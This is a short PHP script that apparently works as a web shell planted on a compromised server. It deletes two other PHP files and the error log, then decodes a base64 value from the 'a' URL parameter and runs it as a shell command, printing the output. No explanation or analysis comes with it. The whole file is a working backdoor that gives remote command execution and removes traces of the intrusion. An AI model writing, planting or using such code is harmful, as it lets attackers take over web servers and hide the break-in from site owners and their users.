<?php
unlink('2042088.php');
unlink('7283597.php');
unlink('error_log');
if ($_GET['a'])
  print_r(shell_exec(urldecode(base64_decode($_GET['a']))));
